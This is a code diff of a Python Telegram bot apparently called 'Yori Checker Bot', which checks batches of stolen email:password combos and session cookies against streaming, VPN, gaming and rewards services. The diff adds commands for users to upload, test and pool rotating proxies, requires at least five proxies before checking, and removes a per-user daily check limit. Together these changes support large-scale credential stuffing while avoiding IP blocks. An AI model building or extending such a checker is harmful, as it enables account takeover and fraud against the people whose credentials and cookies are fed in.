-    is_cookie = service_key in ('netflixcookie', 'spotify', 'prime')
-    context.user_data['is_cookie'] = is_cookie
-
-    service_names = {
-        'expressvpn': 'ExpressVPN',
-        'crunchyroll': 'Crunchyroll',
-        'disney': 'Disney+',
-        'netflixcookie': 'Netflix Cookie',
-        'spotify': 'Spotify Cookie',
-        'prime': 'Prime Video',
-        'microsoft': 'Microsoft Rewards',
-        'nba': 'NBA League Pass',
-        'steam': 'Steam'
-    }
-    service_name = service_names.get(service_key, service_key.capitalize())
-
-    prompt = (
-        f"📤 <b>Session started for {service_name}</b>\n\n"
-        f"{'Send me a .txt file with one cookie (Netscape, JSON, or raw). You can send multiple files one by one.' if is_cookie else 'Send me email:pass combos (one per line) or upload a .txt file with combos. You can send multiple batches.'}\n\n"
-        f"Press 'Cancel' when you're done."
+    context.user_data['state'] = 'adding_proxy'
+    await update.message.reply_text(
+        "📤 Send me a .txt file containing proxies (one per line) or paste a list.\n"
+        "I'll test each and store up to 30 working proxies.\n"
+        "You can send multiple files to accumulate more.\n"
+        "Press 'Cancel' to stop adding.",
+        reply_markup=build_cancel_keyboard()
     )
-    await update.message.reply_text(prompt, reply_markup=build_cancel_keyboard(), parse_mode='HTML')
+
+async def handle_add_proxy_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if context.user_data.get('state') != 'adding_proxy':
+        return
+
+    if update.message.text == "❌ Cancel":
+        context.user_data['state'] = 'idle'
+        await update.message.reply_text("✅ Proxy addition cancelled.", reply_markup=build_main_keyboard(user_id))
+        return
+
+    # Get proxy lines
+    lines = await get_lines_from_text_or_doc(update, context)
+    if not lines:
+        await update.message.reply_text("❌ No proxy data found. Send a .txt file or paste proxies.")
+        return
+
+    # Parse proxies
+    proxies = []
+    for line in lines:
+        p = parse_proxy_line(line)
+        if p:
+            proxies.append(p)
+
+    if not proxies:
+        await update.message.reply_text("❌ No valid proxy lines found (expected IP:port or protocol://IP:port).")
+        return
+
+    # Test proxies in parallel
+    status_msg = await update.message.reply_text(f"⏳ Testing {len(proxies)} proxies...")
+    working = []
+    tested = 0
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        future_to_proxy = {executor.submit(test_proxy, p): p for p in proxies}
+        for future in as_completed(future_to_proxy):
+            proxy = future_to_proxy[future]
+            if future.result():
+                working.append(proxy)
+            tested += 1
+            if tested % 10 == 0:
+                await safe_edit_or_send(status_msg, f"⏳ Tested {tested}/{len(proxies)}, found {len(working)} working...")
+
+    await safe_edit_or_send(status_msg, f"✅ Found {len(working)} working proxies out of {len(proxies)} tested.")
+
+    if not working:
+        await update.message.reply_text("❌ No working proxies found. Please try a different source.")
+        context.user_data['state'] = 'idle'
+        return
+
+    # Store up to 30 per user
+    current_count = count_user_proxies(user_id)
+    max_storage = 30
+    added = 0
+    for proxy in working:
+        if current_count + added >= max_storage:
+            break
+        if add_user_proxy(user_id, proxy):
+            added += 1
+
+    await update.message.reply_text(
+        f"✅ Stored {added} new working proxies. You now have {count_user_proxies(user_id)} proxies.\n"
+        f"(Max {max_storage} per user.)"
+    )
+    context.user_data['state'] = 'idle'
+    await update.message.reply_text("You can now use the checkers.", reply_markup=build_main_keyboard(user_id))
+
+async def removeproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    # User can type /removeproxy <proxy> or send a file/list
+    args = context.args
+    if args:
+        proxy = args[0]
+        if remove_user_proxy(user_id, proxy):
+            await update.message.reply_text(f"✅ Removed proxy: {proxy}")
+        else:
+            await update.message.reply_text(f"❌ Proxy not found in your list: {proxy}")
+        return
+
+    # If no args, ask for file or text
+    await update.message.reply_text(
+        "Send a .txt file or paste a list of proxies to remove (one per line).\n"
+        "I will remove them from your pool."
+    )
+    # We need to handle this in handle_input as a separate state.
+    context.user_data['state'] = 'removing_proxy'
+
+async def handle_remove_proxy_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if context.user_data.get('state') != 'removing_proxy':
+        return
+
+    lines = await get_lines_from_text_or_doc(update, context)
+    if not lines:
+        await update.message.reply_text("❌ No data to remove.")
+        context.user_data['state'] = 'idle'
+        return
+
+    removed = 0
+    for line in lines:
+        proxy = parse_proxy_line(line)
+        if proxy:
+            if remove_user_proxy(user_id, proxy):
+                removed += 1
+
+    await update.message.reply_text(f"✅ Removed {removed} proxies.")
+    context.user_data['state'] = 'idle'
+    await update.message.reply_text("Done.", reply_markup=build_main_keyboard(user_id))
+
+async def myproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    proxies = get_user_proxies(user_id)
+    if not proxies:
+        await update.message.reply_text("❌ You have no proxies stored. Use /addproxy to add some.")
+        return
+    # Send list (limited to avoid huge messages)
+    msg = f"📋 Your proxies ({len(proxies)}):\n" + '\n'.join(proxies[:50])
+    if len(proxies) > 50:
+        msg += f"\n... and {len(proxies)-50} more."
+    await update.message.reply_text(msg)
+
+async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("⛔ Only the owner can reset proxies.")
+        return
+
+    global reset_in_progress
+    reset_in_progress = True
+    reset_all_proxies()
+    await update.message.reply_text("✅ All proxies have been reset. Ongoing checks will be aborted shortly.")
+    # Wait a moment then allow new checks
+    await asyncio.sleep(2)
+    reset_in_progress = False
 
 async def toggle_direct_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -3617,25 +3502,22 @@ async def toggle_direct_mode(update: Update, context: ContextTypes.DEFAULT_TYPE)
         status = "Direct (your server IP will be used)"
     await update.message.reply_text(f"⚙️ Proxy mode toggled to: {status}", reply_markup=build_main_keyboard(user_id))
 
-async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Removed – but keep a stub to avoid errors if someone uses /addproxy
-    await update.message.reply_text("❌ Manual proxy management is removed. Proxies are now automatically scraped.")
-
-async def myproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Manual proxy listing is removed. Proxies are now automatically scraped.")
-
 # ==================== handle_input (modified) ====================
 async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    state = context.user_data.get('state')
 
-    # If in adding_proxy state (deprecated), redirect
-    if context.user_data.get('state') == 'adding_proxy':
-        context.user_data['state'] = 'idle'
-        await update.message.reply_text("Manual proxy addition is no longer supported. Proxies are automatically scraped.", reply_markup=build_main_keyboard(user_id))
+    # Handle adding proxies
+    if state == 'adding_proxy':
+        await handle_add_proxy_input(update, context)
+        return
+
+    if state == 'removing_proxy':
+        await handle_remove_proxy_input(update, context)
         return
 
     # checking state
-    if context.user_data.get('state') == 'checking':
+    if state == 'checking':
         service_key = context.user_data.get('service')
         if not service_key:
             context.user_data['state'] = 'idle'
@@ -3679,7 +3561,9 @@ async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🎮 Microsoft Rewards": "microsoft",
         "🏀 NBA League Pass": "nba",
         "🎮 Steam": "steam",
-        "📊 My Usage": "usage",
+        "➕ Add Proxies": "add_proxy",
+        "➖ Remove Proxy": "remove_proxy",
+        "📊 My Proxy Count": "my_proxies",
     }
     text = update.message.text if update.message.text else ""
     # Check for proxy mode toggle
@@ -3688,12 +3572,59 @@ async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if text in service_map:
         action = service_map[text]
-        if action == "usage":
-            await myusage_command(update, context)
+        if action == "add_proxy":
+            await addproxy_command(update, context)
+        elif action == "remove_proxy":
+            await removeproxy_command(update, context)
+        elif action == "my_proxies":
+            await myproxies_command(update, context)
         else:
             await start_checker(update, context, action)
     else:
         await update.message.reply_text("Please use the buttons or /start for help.", reply_markup=build_main_keyboard(user_id))
+
+async def start_checker(update: Update, context: ContextTypes.DEFAULT_TYPE, service_key: str):
+    user_id = update.effective_user.id
+
+    # Check if user has proxies (unless owner in direct mode)
+    is_direct = (user_id == OWNER_ID and user_id in direct_mode_users)
+    if not is_direct:
+        proxy_count = count_user_proxies(user_id)
+        if proxy_count < 5:
+            await update.message.reply_text(
+                f"❌ You need at least 5 working proxies to use the bot. "
+                f"You currently have {proxy_count}. Use /addproxy to add more."
+            )
+            return
+
+    if context.user_data.get('state') == 'checking':
+        await update.message.reply_text("⚠️ You already have an active session. Please press 'Cancel' first.")
+        return
+
+    context.user_data['state'] = 'checking'
+    context.user_data['service'] = service_key
+    is_cookie = service_key in ('netflixcookie', 'spotify', 'prime')
+    context.user_data['is_cookie'] = is_cookie
+
+    service_names = {
+        'expressvpn': 'ExpressVPN',
+        'crunchyroll': 'Crunchyroll',
+        'disney': 'Disney+',
+        'netflixcookie': 'Netflix Cookie',
+        'spotify': 'Spotify Cookie',
+        'prime': 'Prime Video',
+        'microsoft': 'Microsoft Rewards',
+        'nba': 'NBA League Pass',
+        'steam': 'Steam'
+    }
+    service_name = service_names.get(service_key, service_key.capitalize())
+
+    prompt = (
+        f"📤 <b>Session started for {service_name}</b>\n\n"
+        f"{'Send me a .txt file with one cookie (Netscape, JSON, or raw). You can send multiple files one by one.' if is_cookie else 'Send me email:pass combos (one per line) or upload a .txt file with combos. You can send multiple batches.'}\n\n"
+        f"Press 'Cancel' when you're done."
+    )
+    await update.message.reply_text(prompt, reply_markup=build_cancel_keyboard(), parse_mode='HTML')
 
 async def process_input_lines(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: List[str], service_key: str, is_cookie: bool):
     user_id = update.effective_user.id
@@ -3711,17 +3642,10 @@ async def process_input_lines(update: Update, context: ContextTypes.DEFAULT_TYPE
     service_name = service_names.get(service_key, service_key.capitalize())
 
     if is_cookie:
-        # Combine all lines into one cookie string (ignore extra lines)
         combined = '\n'.join(lines)
         entries = [combined]
     else:
         entries = lines
-
-    if user_id != OWNER_ID:
-        allowed, remaining, reset_date = can_check(user_id, service_key)
-        if not allowed:
-            await update.message.reply_text(f"⛔ Daily limit ({DAILY_LIMIT}) reached for {service_name}.\nResets on {reset_date}.")
-            return
 
     checker_map = {
         'expressvpn': ExpressVPNChecker,
@@ -3790,10 +3714,10 @@ def main():
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("cancel", cancel_command))
-    # Remove proxy commands, but add stubs to avoid errors
     app.add_handler(CommandHandler("addproxy", addproxy_command))
-    app.add_handler(CommandHandler("myproxy", myproxy_command))
-    app.add_handler(CommandHandler("usage", myusage_command))
+    app.add_handler(CommandHandler("removeproxy", removeproxy_command))
+    app.add_handler(CommandHandler("myproxies", myproxies_command))
+    app.add_handler(CommandHandler("reset", reset_command))  # owner only
 
     app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_input))
 
@@ -3801,7 +3725,7 @@ def main():
     import threading
     threading.Thread(target=run_web_server, daemon=True).start()
 
-    logger.info("🤖 Yori Checker Bot with automatic proxy scraping is running...")
+    logger.info("🤖 Yori Checker Bot with per-user proxy management is running...")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
